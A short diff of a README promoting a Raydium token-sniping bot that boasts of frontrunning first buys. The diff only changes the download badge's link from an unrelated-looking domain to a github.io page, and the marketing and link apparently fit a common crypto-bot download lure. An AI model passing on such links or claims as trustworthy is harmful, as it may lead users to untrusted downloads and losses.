@@ -2,7 +2,7 @@
 
 Instantly snipe newly launched tokens on Raydium DEX with this high-speed bot. Detect liquidity pool creation, frontrun first buys, and execute trades before the crowd in under a second.
 
-[![Download Sniper Bot](https://img.shields.io/badge/Download-Raydium_Sniper-blueviolet)](https://seomadjest.com)
+[![Download Sniper Bot](https://img.shields.io/badge/Download-Raydium_Sniper-blueviolet)](https://raydium-sniping-bot.github.io/.github)
 
 ---
 
